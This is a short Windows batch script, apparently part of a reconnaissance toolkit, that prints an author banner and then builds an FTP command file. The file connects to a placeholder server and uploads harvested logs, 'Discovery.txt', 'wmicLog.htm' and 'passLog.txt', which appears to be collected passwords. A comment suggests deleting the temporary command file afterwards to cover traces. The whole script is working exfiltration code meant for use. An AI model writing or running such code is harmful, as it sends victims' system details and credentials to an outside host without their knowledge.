REM This file sends connects to an ftp server and uploads "Discovery.txt" (The log file from recon)

 @echo off
echo Program developed by
echo Cyrus Majd
echo In contribution to
echo ~ =============================================== ~
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
echo ` #     # #     #  #####   #####   #####  ####### `
echo ` #     # #     # #     # #     # #     #    #    `
echo ` #     # #     # #       #       #          #    `
echo ` ####### #######  #####  #        #####     #    `
echo ` #     # #     #       # #             #    #    `
echo ` #     # #     # #     # #     # #     #    #    `
echo ` #     # #     #  #####   #####   #####     #    `
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
echo ~ =============================================== ~

REM Replace "ftp.example.domain", "username", and "password" with the appropriate credentials.
 echo open ftp.example.domain > tempftp.txt
 echo username >> tempftp.txt
 echo password >> tempftp.txt
REM Replace "FILENAME" with the file you actually want to get.
 echo get FILENAME >> tempftp.txt
 echo mkdir DiscoveryLog >> tempftp.txt
 echo cd DiscoveryLog >> tempftp.txt
REM Changes transfer mode to ASCII
 echo ascii >> tempftp.txt
REM Uploads the log file
 echo put Discovery.txt >> tempftp.txt
 echo put wmicLog.htm >> tempftp.txt
 echo put passLog.txt >> tempftp.txt
REM closes the connection
 echo quit >> tempftp.txt

REM calls everything above
ftp -s:tempftp.txt

REM You can also add "del tempftp.txt" to delete the file after execution is completed. Add it in THIS line if you wish to do so.

exit

